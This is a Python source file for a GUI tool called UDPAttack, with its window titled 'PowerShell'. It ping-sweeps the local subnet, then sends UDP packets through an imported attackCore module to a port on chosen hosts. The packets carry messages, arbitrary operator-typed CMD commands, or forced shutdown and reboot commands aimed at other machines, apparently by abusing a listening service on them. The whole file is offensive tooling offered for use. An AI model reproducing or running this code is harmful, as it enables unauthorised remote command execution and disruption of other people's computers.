import datetime
import socket
import subprocess
from threading import Thread

import customtkinter as ctk

from combat.UDP import attackCore
from combat.UDP.Ui_UDPAttack import F1_UDP


class Ui_UDPAttacker(object):
    def setupUi(self, UDPAttacker):
        # 1. 窗口基础设置 - 适当增加了高度以容纳更大的输入框
        UDPAttacker.title("PowerShell")
        UDPAttacker.geometry("600x450")
        ctk.set_appearance_mode("dark")

        UDPAttacker.grid_columnconfigure(0, weight=1)
        UDPAttacker.grid_columnconfigure(1, weight=1)
        UDPAttacker.grid_rowconfigure(1, weight=1)

        # --- 顶部标题 ---
        # self.header_frame = ctk.CTkFrame(UDPAttacker, corner_radius=0)
        # self.header_frame.grid(row=0, column=0, columnspan=2, sticky="nsew", padx=5, pady=2)
        #
        # self.label_5 = ctk.CTkLabel(
        #     self.header_frame,
        #     text="PowerShell BY NTD",
        #     font=ctk.CTkFont(family="Microsoft YaHei UI", size=16, weight="bold")
        # )
        # self.label_5.pack(pady=8)

        # --- 左侧面板 (日志与控制) ---
        self.groupBox_2344 = ctk.CTkFrame(UDPAttacker)
        self.groupBox_2344.grid(row=1, column=0, sticky="nsew", padx=8, pady=8)
        self.groupBox_2344.grid_columnconfigure(0, weight=1)
        self.groupBox_2344.grid_columnconfigure(1, weight=1)
        self.groupBox_2344.grid_rowconfigure(2, weight=1)

        self.label = ctk.CTkLabel(
            self.groupBox_2344,
            text="          1查看手册\nAlt+S发送   Alt+P停止",
            font=ctk.CTkFont(family="Microsoft YaHei", size=11),
            text_color="gray70",
            justify="left"
        )
        self.label.grid(row=1, column=0, columnspan=2, padx=10, pady=5)

        self.textBrowser = ctk.CTkTextbox(self.groupBox_2344, font=("Consolas", 12))
        self.textBrowser.grid(row=2, column=0, columnspan=2, padx=8, pady=5, sticky="nsew")
        self.textBrowser.insert("0.0", "--- 日志已就绪 ---\n")

        self.pushButton_4 = ctk.CTkButton(self.groupBox_2344, text="扫描IP", height=32)
        self.pushButton_4.grid(row=3, column=0, padx=5, pady=10, sticky="ew")

        self.pushButton = ctk.CTkButton(self.groupBox_2344, text="发送（S）", height=32, fg_color="#2E7D32",
                                        hover_color="#1B5E20")
        self.pushButton.grid(row=3, column=1, padx=5, pady=10, sticky="ew")

        # --- 右侧面板 (参数配置) ---
        self.groupBox_33 = ctk.CTkFrame(UDPAttacker)
        self.groupBox_33.grid(row=1, column=1, sticky="nsew", padx=8, pady=8)
        self.groupBox_33.grid_columnconfigure(0, weight=1)
        self.groupBox_33.grid_columnconfigure(1, weight=1)
        # 配置行权重，使两个大输入框平分剩余空间
        self.groupBox_33.grid_rowconfigure(5, weight=1)
        self.groupBox_33.grid_rowconfigure(6, weight=1)

        # IP 输入框：通过 columnspan=2 占满整行，并设置默认值
        self.textEdit = ctk.CTkEntry(self.groupBox_33, placeholder_text="IP (分号隔开)", height=35)
        self.textEdit.insert(0, "192.168.")
        self.textEdit.grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky="ew")

        # 按钮容器：让 OFF (pushButton_2) 和 OFFline (pushButton_3) 并排
        btn_frame = ctk.CTkFrame(self.groupBox_33, fg_color="transparent")
        btn_frame.grid(row=1, column=0, columnspan=2, sticky="ew", padx=5)
        btn_frame.grid_columnconfigure(0, weight=1)
        btn_frame.grid_columnconfigure(1, weight=1)

        # --- OFF 按钮 ---
        self.pushButton_2 = ctk.CTkButton(
            btn_frame,
            text="OFF",
            fg_color="#D32F2F",  # 深红色背景
            hover_color="#B71C1C",  # 悬停时更深
            border_width=1,  # 细边框
            border_color="#FFCDD2",  # 浅色描边增加立体感
            corner_radius=6,  # 微圆角
            font=("Microsoft YaHei", 12, "bold"),  # 字体加粗
            height=30
        )
        self.pushButton_2.grid(row=0, column=0, padx=5, pady=5, sticky="ew")

        # ---  OFFline 按钮 ---
        self.pushButton_3 = ctk.CTkButton(
            btn_frame,
            text="OFFline",
            fg_color="#F57C00",  # 橙色背景
            hover_color="#E65100",  # 悬停时更深
            border_width=1,
            border_color="#FFE0B2",  # 浅色描边
            corner_radius=6,
            font=("Microsoft YaHei", 12, "bold"),  # 字体加粗
            height=30
        )
        self.pushButton_3.grid(row=0, column=1, padx=5, pady=5, sticky="ew")

        # 紧凑配置区
        controls_frame = ctk.CTkFrame(self.groupBox_33, fg_color="transparent")
        controls_frame.grid(row=2, column=0, columnspan=2, sticky="ew", padx=5, pady=5)
        controls_frame.grid_columnconfigure(1, weight=1)

        # 端口
        ctk.CTkLabel(controls_frame, text="端口:").grid(row=0, column=0, padx=5, pady=2, sticky="w")
        self.spinBox_2 = ctk.CTkEntry(controls_frame, width=100)
        self.spinBox_2.insert(0, "4988")
        self.spinBox_2.grid(row=0, column=1, padx=5, pady=2, sticky="e")

        # 循环
        ctk.CTkLabel(controls_frame, text="次数:").grid(row=1, column=0, padx=5, pady=2, sticky="w")
        self.spinBox_3 = ctk.CTkEntry(controls_frame, width=100)
        self.spinBox_3.insert(0, "1")
        self.spinBox_3.grid(row=1, column=1, padx=5, pady=2, sticky="e")

        # 等待
        ctk.CTkLabel(controls_frame, text="时间(秒):").grid(row=2, column=0, padx=5, pady=2, sticky="w")
        self.spinBox = ctk.CTkEntry(controls_frame, width=100)
        self.spinBox.insert(0, "1")
        self.spinBox.grid(row=2, column=1, padx=5, pady=2, sticky="e")

        # --- 大输入框区域 ---

        # CMD 命令
        self.textEdit_2 = ctk.CTkTextbox(self.groupBox_33, height=110, font=("Consolas", 12), border_width=2,
                                         text_color="gray", undo=True)
        self.textEdit_2.grid(row=5, column=0, columnspan=2, padx=10, pady=8, sticky="nsew")
        self.textEdit_2.insert("0.0", "PowerShell")
        self.textEdit_2.bind("<FocusIn>",
                             lambda e: self._handle_placeholder(self.textEdit_2, "PowerShell", "in"))
        self.textEdit_2.bind("<FocusOut>",
                             lambda e: self._handle_placeholder(self.textEdit_2, "PowerShell", "out"))

        # 消息内容
        self.plainTextEdit = ctk.CTkTextbox(self.groupBox_33, height=110, font=("Microsoft YaHei", 12), border_width=2,
                                            text_color="gray", undo=True)
        self.plainTextEdit.grid(row=6, column=0, columnspan=2, padx=10, pady=8, sticky="nsew")
        self.plainTextEdit.insert("0.0", "发送信息，留空则不发送")
        self.plainTextEdit.bind("<FocusIn>",
                                lambda e: self._handle_placeholder(self.plainTextEdit, "发送信息，留空则不发送",
                                                                   "in"))
        self.plainTextEdit.bind("<FocusOut>",
                                lambda e: self._handle_placeholder(self.plainTextEdit, "发送信息，留空则不发送",
                                                                   "out"))

    def _handle_placeholder(self, widget, placeholder, mode):
        # 获取当前内容（去掉末尾换行符）
        current_text = widget.get("0.0", "end").strip()

        if mode == "in":
            # 当光标进入，如果是提示词，则清空并把颜色变回正常
            if current_text == placeholder:
                widget.delete("0.0", "end")
                # 使用元组形式，确保在深色和浅色模式下都能正常显示
                widget.configure(text_color=("black", "white"))
        elif mode == "out":
            # 当光标离开，如果没写内容，则补回提示词并变灰
            if not current_text:
                widget.insert("0.0", placeholder)
                widget.configure(text_color="gray")

    def open_edit_window(self, event=None):
        # 检查窗口是否已经存在，避免重复打开
        if self.toplevel_window is None or not self.toplevel_window.winfo_exists():
            self.toplevel_window = EditWindow(self)
        else:
            self.toplevel_window.focus()  # 如果已存在则聚焦

class EditWindow(ctk.CTkToplevel):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.geometry("800x300")
        self.title("常用指令")

        # 确保窗口始终在最上层
        self.attributes("-topmost", True)

        # 添加文本框
        # 设置窗口的行列权重，使其可拉伸
        self.grid_rowconfigure(0, weight=1)  # 第0行弹性增长
        self.grid_columnconfigure(0, weight=1)  # 第0列弹性增长

        self.textbox = ctk.CTkTextbox(self)
        # sticky="nsew": 像磁铁一样贴住 北(N) 南(S) 东(E) 西(W)
        self.textbox.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")

        # 插入默认文字
        self.textbox.insert("0.0", F1_UDP)

class UDPAttack(ctk.CTk, Ui_UDPAttacker):
    def __init__(self):
        super().__init__()
        self.toplevel_window = None
        self.bind("<F1>", self.open_edit_window)
        # 初始化 UI
        self.setupUi(self)
        # 初始化逻辑变量
        self.setup()
        self.attributes("-topmost", True) #权威置顶

    def setup(self):
        self.running = 0
        self.maxl = 0
        self.stop_flag = False  # 初始化终止开关
        # 将 attackCore 的日志重定向到界面的 log_message 方法
        attackCore.tt = self

    def terminate_task(self, event=None):
        self.stop_flag = True
        self.log_message("停止循环...")

    def emit(self, message):
        """适配 attackCore 中调用的 tt.emit 方法"""
        self.log_message(message)

    def log_message(self, message):
        """在 textBrowser 中追加日志"""
        self.textBrowser.insert("end", f"{message}\n")
        self.textBrowser.see("end")

    def get_ip_text(self):
        """获取 IP 文本框内容"""
        return self.textEdit.get().strip()

    def get_cmd_text(self):
        """获取命令文本框内容"""
        content = self.textEdit_2.get("0.0", "end").strip()
        # 必须与 setupUi 中定义的占位符 "PowerShell" 完全一致
        if content == "PowerShell" or not content:
            return ""
        return content

    def get_msg_text(self):
        """获取消息内容文本框内容"""
        content = self.plainTextEdit.get("0.0", "end").strip()
        # 必须与 setupUi 中定义的占位符 "发送信息，留空则不发送" 完全一致
        if content == "发送信息，留空则不发送" or not content:
            return ""
        return content

    def set_buttons_state(self, state):
        """统一管理按钮状态: 'normal' 或 'disabled'"""
        self.pushButton.configure(state=state)  # 发送
        self.pushButton_2.configure(state=state)  # OFF
        self.pushButton_3.configure(state=state)  # OFFline
        self.pushButton_4.configure(state=state)  # 扫描IP

    def scanIP(self):
        self.log_message(f"[{datetime.datetime.now().strftime('%H:%M:%S')}] 开始扫描局域网IP...")
        try:
            local_ip = socket.gethostbyname(socket.gethostname())
            ip_prefix = ".".join(local_ip.split(".")[:-1])
        except:
            ip_prefix = "192.168.1"

        cnt = 0
        for i in range(1, 255):
            if not self.running: break
            target = f"{ip_prefix}.{i}"
            # 使用 ping -n 1 快速检测
            res = subprocess.run(f"ping {target} -n 1 -w 10", shell=True, stdout=subprocess.PIPE)
            if res.returncode == 0:
                self.log_message(f"获取到IP: {target}")
                cnt += 1

        self.log_message(f"扫描完毕，共发现 {cnt} 个活跃 IP")
        self.running = 0
        self.pushButton_4.configure(text="扫描IP")

    def sendMessage(self):
        self.stop_flag = False
        self.set_buttons_state("disabled")
        try:
            self.maxl = 0
            ip_raw = self.get_ip_text()
            ip_list = [ip.strip() for ip in ip_raw.split(";") if ip.strip()]

            if not ip_list:
                self.log_message("请输入 IP 地址")
                return

            msg_txt = self.get_msg_text()
            cmd_txt = self.get_cmd_text()

            sendList = []
            if msg_txt:
                sendList.append(attackCore.pkg_sendlist("-msg", msg_txt.replace("\n", " ")))
            if cmd_txt:
                sendList.append(attackCore.pkg_sendlist("-c", cmd_txt.replace("\n", "&")))

            if sendList:
                # 核心改进：为每个 IP 启动独立线程
                for ip in ip_list:
                    if self.stop_flag: break
                    # 使用 lambda 或 partial 包装发送函数
                    t = Thread(target=self._exec_send, args=(sendList, ip), daemon=True)
                    t.start()

        except Exception as e:
            self.log_message(f"运行出错: {e}")
        finally:
            self.set_buttons_state("normal")

    def _exec_send(self, sendList, ip):
        """内部调用的发送执行函数"""
        try:
            attackCore.send(
                sendList,
                ip,
                l=int(self.spinBox_3.get()),
                t=int(self.spinBox.get()),
                p=int(self.spinBox_2.get())
            )
            # 由于是多线程日志，建议在 tt.emit 中处理 UI 刷新安全
        except Exception as e:
            self.log_message(f"发送至 {ip} 异常: {e}")

    def shutdown(self):
        self.stop_flag = False  # 每次启动前重置
        self.set_buttons_state("disabled")  # 开始时全部禁用
        try:
            """构造关机命令包并发送给对方"""
            ip_raw = self.get_ip_text()
            if not ip_raw:
                self.log_message("请输入IP")
                return

            # 构造关机指令：-s 关机，-t 0 立即执行
            cmd_str = "shutdown -s -t 0 -f"

            for ip in ip_raw.split(";"):
                # IP 间的层级也检查一下，双重保险
                if self.stop_flag: break
                ip = ip.strip()
                if not ip: continue

                # 复用你代码中的打包逻辑：使用 -c 标识这是一个 CMD 命令
                # 这里的 " " * self.maxl 是为了匹配你原有的长度填充逻辑
                payload = attackCore.pkg_sendlist("-c", cmd_str + " " * self.maxl)

                try:
                    attackCore.send(
                        [payload],
                        ip,
                        l=int(self.spinBox_3.get()),  # 复用界面上的循环次数
                        t=int(self.spinBox.get()),  # 复用界面上的等待时间
                        p=int(self.spinBox_2.get())  # 复用界面上的端口
                    )
                    print(f"已向 {ip} 发送命令")
                    # 更新最大长度记录
                    self.maxl = max(self.maxl, len(cmd_str))
                except Exception as e:
                    self.log_message(f"发送至 {ip} 失败: {str(e)}")
                    pass
        finally:
            self.set_buttons_state("normal")  # 结束时全部恢复

    def reboot(self):
        self.stop_flag = False  # 每次启动前重置
        """构造重启命令包并发送给对方"""
        self.set_buttons_state("disabled")  # 开始时全部禁用
        try:
            ip_raw = self.get_ip_text()
            if not ip_raw:
                self.log_message("请输入IP")
                return

            # 构造重启指令：-r 重启
            cmd_str = "shutdown -r -t 0 -f"

            for ip in ip_raw.split(";"):
                # IP 间的层级也检查一下，双重保险
                if self.stop_flag: break
                ip = ip.strip()
                if not ip: continue

                payload = attackCore.pkg_sendlist("-c", cmd_str + " " * self.maxl)

                attackCore.send(
                    [payload],
                    ip,
                    l=int(self.spinBox_3.get()),
                    t=int(self.spinBox.get()),
                    p=int(self.spinBox_2.get())
                )
                print(f"已向 {ip} 发送命令")
                self.maxl = max(self.maxl, len(cmd_str))
        except Exception as e:
            self.log_message(f"发送至 {ip} 失败: {str(e)}")
        finally:
            # 恢复按钮
            self.set_buttons_state("normal")  # 结束时全部恢复

    def scanIIp(self):
        if not self.running:
            self.running = 1
            self.pushButton_4.configure(text="停止扫描")
            Thread(target=self.scanIP, daemon=True).start()
        else:
            self.running = 0
            self.pushButton_4.configure(text="扫描IP")

# 程序启动
def open_udp():
    app = UDPAttack()

    app.pushButton_4.configure(command=app.scanIIp)
    # 必须使用 Thread，否则界面还没来得及变灰(disabled)就卡住了
    app.pushButton.configure(command=lambda: Thread(target=app.sendMessage, daemon=True).start())
    app.pushButton_2.configure(command=lambda: Thread(target=app.shutdown, daemon=True).start())
    app.pushButton_3.configure(command=lambda: Thread(target=app.reboot, daemon=True).start())

    app.bind("<Alt-s>", lambda e: Thread(target=app.sendMessage, daemon=True).start())
    # 绑定 Alt+P 为终止功能
    app.bind("<Alt-p>", app.terminate_task)
    app.mainloop()

if __name__ == "__main__":
    open_udp()